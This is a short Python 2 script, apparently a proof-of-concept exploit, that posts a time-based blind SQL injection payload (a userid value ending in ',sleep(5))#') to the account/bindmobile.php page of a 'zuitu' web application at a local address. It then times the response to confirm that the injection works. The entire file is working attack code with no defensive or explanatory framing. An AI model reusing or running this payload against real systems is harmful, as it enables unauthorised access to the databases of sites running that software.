#!/usr/bin/env python
#coding=utf-8

import time
import datetime
import urllib2
import urllib
import cookielib

exp_url = "http://192.168.1.102/zuitu/account/bindmobile.php"
value = {"userid":"sssssssssssssssssssss',sleep(5))#"}
post_data=urllib.urlencode(value)
cj =  cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
headers ={"User-agent":"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"}
req=urllib2.Request(exp_url,post_data,headers)
t1 = datetime.datetime.now()
req_resp = opener.open(req).read()
#print resp
t2 = datetime.datetime.now()
print (t2-t1).seconds
